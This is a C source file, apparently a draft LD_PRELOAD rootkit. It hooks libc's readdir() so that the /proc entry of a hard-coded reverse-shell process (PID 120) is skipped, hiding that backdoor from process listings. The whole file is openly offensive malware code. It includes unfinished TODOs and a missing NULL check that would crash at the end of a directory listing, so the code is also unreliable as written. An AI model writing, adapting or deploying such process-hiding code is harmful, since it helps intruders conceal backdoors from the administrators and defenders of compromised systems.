#include <asm-generic/errno.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define REVERSE_SHELL_PID 120

// TODO: static int get_reverse_shell_pid(void);
static bool entry_name_from_libc_readdir_is_reverse_shell_pid(char const *d_name);
static bool dirp_is_in_procfs(DIR *dirp);

/*
 * readdir() wlil set errno + return NULL if error
 * (error) edge cases:
 * if dirp is in subdir of hiding process, return NULL + set errno
 */
struct dirent *readdir(DIR *dirp) {

  /* 
   * Function: dlsym  
   * Prototype: void *dlsym(void *handle, char *symbol);
   *
   * Parameters: 
   *   handle - A handle from dlopen(), or RTLD_NEXT/RTLD_DEFAULT
   *   symbol - NULL-terminated string  
   * 
   * Returns: 
   *   NULL pointer if symbol is not found 
   */
  struct dirent *(*libc_readdir)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir");
  if (libc_readdir == NULL) {
    errno = 1; // TODO: correct errno?
    errno = EISNAM;
    return NULL;
  }

  struct dirent *entry_from_libc_readdir = libc_readdir(dirp);

  if (!entry_name_from_libc_readdir_is_reverse_shell_pid(entry_from_libc_readdir->d_name)) {
    return entry_from_libc_readdir;
  }

  if (!dirp_is_in_procfs(dirp)) {
    return entry_from_libc_readdir;
  }

  return readdir(dirp);
}

static bool entry_name_from_libc_readdir_is_reverse_shell_pid(const char *d_name) {
  char *endptr;
  errno = 0;
  long d_name_number = strtol(d_name, &endptr, 10);
  return errno == 0 && *endptr == '\0' && d_name_number == REVERSE_SHELL_PID;
}

static bool dirp_is_in_procfs(DIR *dirp) {

  // get file descriptor associated with `dirp`
  int dirp_fd = dirfd(dirp);
  if (dirp_fd < 0) {
    perror("dirfd");
    errno =
        1; // TODO: is this correct way to set `errno`? Also set to 0 at top + handle errors in `readdir`? + there is macro for correct errno num
    return false;
  }

  // read symlink /proc/self/fd/`dirp_fd` to get path of `dirp`'s pathname
  char dirp_fd_pathname[255];
  char dirp_pathname[255];
  snprintf(dirp_fd_pathname, sizeof(dirp_fd_pathname), "/proc/self/fd/%d", dirp_fd);
  ssize_t dirp_pathname_len = readlink(dirp_fd_pathname, dirp_pathname, sizeof(dirp_pathname) - 1);

  if (dirp_pathname_len == -1) {
    errno = 1; // TODO: is this correct value of `errno`?
    return false;
  }

  dirp_pathname[dirp_pathname_len] = '\0';

  // check if `dirp_pathname` is /proc or /proc/xxxx
  // TODO: sscanf
  // return sscanf("/proc/%d", pid)
  return (strncmp(dirp_pathname, "/proc/", strlen("/proc/")) == 0 ||
          strcmp("/proc", dirp_pathname) == 0);
}
